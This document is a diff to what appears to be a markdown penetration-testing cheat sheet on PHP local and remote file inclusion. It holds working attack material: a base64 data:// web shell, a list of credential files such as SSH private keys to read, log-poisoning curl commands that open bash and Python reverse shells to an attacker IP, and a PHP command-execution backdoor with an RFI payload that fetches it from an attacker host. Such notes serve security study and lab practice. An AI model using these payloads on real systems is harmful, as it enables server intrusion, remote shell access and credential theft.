@@ -88,7 +88,7 @@ PHP wrappers have the same general functionality as normal LFI, but they can byp
 ```
 php://filter/string.rot13/resource=../../../../../etc/passwd
 php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd                              // Use to read PHP files (resource=index.php)
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt         // `cmd` argument inclusion, prints "Shell done!" if it works
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt         // `cmd` argument inclusion, prints "Shell done!" if it works. "allow_url_inclue" needs to be enabled for it to work.
 ```
 
 
@@ -119,6 +119,7 @@ Other potentially interesting files:
 	/home/USER_FOUND/.ssh/id_rsa
 	/home/USER_FOUND/.bash_history
 	/home/USER_FOUND/.bash_profile
+	/home/USER_FOUND/.bashrc
 
 ```
 
@@ -155,8 +156,8 @@ To use the payload, send a request to the log file with the command in your payl
 curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=PAYLOAD
 
 // Examples
-curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=sh -i >& /dev/tcp/10.8.1.167/4444 0>&1
-curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=export RHOST="10.8.1.167";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=bash -i >& /dev/tcp/10.8.1.167/4444 0>&1
+	curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=export RHOST="10.8.1.167";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 ```
 
 ### Note
@@ -166,3 +167,23 @@ If you can read `/etc/passwd`, go through every user's home directory for the `.
 
 ##### Mongo
 Target file: `/var/www/dev/index.js`
+
+### RFI
+For remote file inclusion, the goal is to load extra PHP from an outside source (the attacker) into the target webpage.
+##### Note: make sure the file is hosted using `python3`, and not a host that will parse away the PHP.
+##### Example
+```php
+<?php
+if(isset($_REQUEST['cmd'])){
+	echo "<pre>";                 # Will load the <pre> tag, making the target website's PHP parser load the command first
+	$cmd = ($_REQUEST['cmd']);
+	system($cmd);
+	echo "</pre>";
+	die;
+}
+?>
+```
+##### Payload
+```
+?page=http://192.168.45.232/php_backdoor.php&cmd=id
+```
